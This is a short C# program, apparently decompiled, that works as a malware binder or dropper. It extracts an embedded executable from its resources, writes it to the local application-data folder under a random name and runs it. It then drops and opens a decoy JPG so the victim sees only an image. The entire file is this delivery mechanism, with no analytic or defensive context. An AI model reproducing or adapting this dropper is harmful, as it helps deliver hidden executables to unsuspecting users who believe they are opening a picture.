using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Bound;

internal static class Open
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "WBRHKmqIyQ.exe", (byte[])resourceManager.GetObject("uhJslgzlgX"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "WBRHKmqIyQ.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "oqLXmPz_OH.jpg", (byte[])resourceManager.GetObject("CzPnMXsuZf"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "oqLXmPz_OH.jpg");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
